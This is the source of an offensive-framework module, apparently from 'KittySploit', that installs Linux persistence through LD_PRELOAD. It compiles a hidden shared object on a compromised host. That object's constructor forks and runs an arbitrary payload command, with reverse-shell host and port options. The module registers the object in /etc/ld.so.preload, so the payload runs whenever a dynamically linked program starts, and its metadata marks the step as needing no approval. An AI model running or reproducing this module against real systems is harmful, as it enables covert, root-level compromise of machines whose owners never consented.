#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.post.linux.persistence_helpers import LinuxPersistenceMixin, PERSISTENCE_AGENT


class Module(Post, LinuxPersistenceMixin):
    __info__ = {
        "name": "LD_PRELOAD Persistence",
        "description": (
            "Builds a shared library with a constructor that runs a payload, installs it "
            "on disk, and adds its path to /etc/ld.so.preload."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": ["persistence", "ld.so.preload", "linux", "root"],
        "references": ["https://attack.mitre.org/techniques/T1574/006/"],
    'agent': {
        'risk': '',
        'effects': [],
        'expected_requests': 1,
        'reversible': True,
        'approval_required': False,
        'produces': [],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['shell'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'root', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    so_path = OptString(
        "/usr/local/lib/.libks-cache.so",
        "Remote path for the malicious shared object",
        True,
    )
    preload_path = OptString("/etc/ld.so.preload", "Path to ld.so.preload", False)
    payload_path = OptString("", "Payload module (Linux command executed via system())", True)
    target = OptChoice("Linux command", "Payload type", True, choices=["PHP", "Linux command"])
    lhost = OptString("", "Local host for reverse payloads", False)
    lport = OptPort(4444, "Local port for reverse payloads", False)
    gcc_path = OptString("", "Compiler path (empty = auto-detect gcc)", False)

    def _compiler(self) -> str:
        manual = self._opt(self.gcc_path)
        if manual:
            return manual
        for candidate in ("gcc", "cc"):
            if self.command_exists(candidate):
                return candidate
        return ""

    def _c_source(self, payload_cmd: str) -> str:
        escaped = payload_cmd.replace("\\", "\\\\").replace('"', '\\"')
        return f"""#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void ks_init(void) {{
    if (fork() == 0) {{
        execl("/bin/sh", "sh", "-c", "{escaped}", (char *)0);
        _exit(0);
    }}
}}
"""

    def check(self):
        if not self._is_root():
            print_error("Root privileges required for /etc/ld.so.preload")
            return False
        if not self._compiler():
            print_error("No C compiler found (gcc/cc)")
            return False
        so = self._opt(self.so_path)
        so_dir = so.rsplit("/", 1)[0]
        if not self._writable_target(so, so_dir):
            print_error(f"Cannot write shared object path: {so}")
            return False
        preload = self._opt(self.preload_path)
        if not self._writable_target(preload, preload.rsplit("/", 1)[0]):
            print_error(f"Cannot write {preload}")
            return False
        print_success("Root, compiler, and target paths look usable")
        return True

    def run(self):

        if not self.linux_require_linux():
            return False

        if not self.check():
            return False

        encoded = self._generate_payload()
        so = self._opt(self.so_path)
        preload = self._opt(self.preload_path)
        compiler = self._compiler()
        src = "/tmp/.ks-preload.c"
        runtime = self._runtime_command(encoded)

        self._maybe_backup(preload, "ld_so_preload")
        if self.file_exist(so):
            self._maybe_backup(so, "ld_preload_so")

        print_status("Writing and compiling shared object on target")
        if not self._write_remote_file(src, self._c_source(runtime), mode="0600"):
            raise ProcedureError(FailureType.PayloadFailed, "Cannot write C source")

        compile_cmd = f"{compiler} -shared -fPIC -o {so} {src} -nostartfiles -ldl 2>&1"
        out = self.linux_execute(compile_cmd)
        if not self.file_exist(so):
            raise ProcedureError(FailureType.PayloadFailed, f"Compilation failed: {out}")

        self.linux_execute(f"chmod 755 {so} && rm -f {src}")

        existing = self.read_file(preload) if self.file_exist(preload) else ""
        if so not in (existing or ""):
            print_status(f"Adding {so} to {preload}")
            if existing and not existing.endswith("\n"):
                existing += "\n"
            new_content = (existing or "") + so + "\n"
            if not self._write_remote_file(preload, new_content, mode="0644"):
                raise ProcedureError(FailureType.PayloadFailed, f"Cannot update {preload}")
        else:
            print_warning(f"{so} already listed in {preload}")

        print_good("LD_PRELOAD persistence installed.")
        print_status("Payload runs when dynamically linked programs start (constructor).")
        return True
